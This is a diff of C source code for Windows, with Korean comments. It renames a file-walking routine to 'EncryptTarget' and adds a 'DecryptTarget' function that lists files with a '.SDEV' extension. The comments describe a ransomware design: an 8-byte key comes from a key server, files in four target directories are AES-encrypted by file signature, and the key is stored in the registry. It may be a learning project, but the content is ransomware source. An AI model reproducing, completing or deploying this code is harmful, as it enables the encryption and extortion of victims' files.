@@ -30,7 +30,7 @@ wchar_t* getUserName() {
     return buf;
 }
 
-void calldir(target* t, unsigned char* key) {
+void EncryptTarget(target* t, unsigned char* key) {
     //wchar_t path[1000]; 
     wchar_t path1[1000]; //Readfile, Writefile, 확장자 변경을 위한 path1
     wcscpy(t->file, t->addr);
@@ -231,22 +231,38 @@ void calldir(target* t, unsigned char* key) {
     FindClose(hFind);
 }
 
-/*
-unsigned char* generateRandomKey(unsigned char* key, int length) {
 
-    //rand()의 시드값 설정
-    srand((unsigned char)time(NULL));
+void DecryptTarget(target* t, unsigned char* key) {
+    wchar_t path2[1000]; //Readfile, Writefile 원래의 확장자 변경을 위한 path2
+    wcscpy(path2, t->addr);
 
-    for (int i = 0; i < length; i++) {
-        key[i] = rand() % 256;
+    struct AES_ctx ctx;
+
+    printf("\n----------------------\n");
+    wcscat(path2, L"*");
+    printf("path :%S\n", path2);
+
+    WIN32_FIND_DATAW FindData; //파일 검색 데이터 구조체 변수
+    HANDLE hFind;  //파일 검색 핸들
+    hFind = FindFirstFileW(path2, &FindData);//파일 검색 시작
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        puts("NO FILE.");
+        return;
     }
-    printf("key : ");
-    for (int i = 0; i < 8; i++) {
-        printf("%02x ", key[i]);
-    }
-    printf("\n");
-    return key;
-}*/
+
+    do {
+        wcscpy(path2, t->addr); // 그냥 다시 리셋해서 주소 받고
+        wcscat(path2, FindData.cFileName); // 파일 이름 추가
+
+        wchar_t* dotPos = wcsrchr(FindData.cFileName, L'.');
+        if (dotPos && wcscmp(dotPos, L".SDEV") == 0) {
+            wprintf(L"%s\n", path2);
+        }
+    } while (FindNextFileW(hFind, &FindData));
+
+    FindClose(hFind);
+}
 
 
 
@@ -314,11 +330,11 @@ int main()
 
     //generateRandomKey(randomKey, sizeof(randomKey));
     
-    //calldir함수를 통해 target구조체 변수 주소 받으면 tt[4]배열에 각각 Directory들 주소 저장된다.
+    //EncryptTarget함수를 통해 target구조체 변수 주소 받으면 tt[4]배열에 각각 Directory들 주소 저장된다.
     //8byte 랜덤하게 생성할 키 선언 -> 키 서버를 통해 전달 받음.
     //전달받은 key를 톨해서 target 경로별 각 시그니처에 맞는 파일들을 AES 암호화 진행
     for (int i = 0; i < 4; i++)
-        calldir(&tt[i], randomKey);
+        EncryptTarget(&tt[i], randomKey);
 
     // key를 생성하고 레지스트리에 저장
     printf("---------------------------------------------------\n");
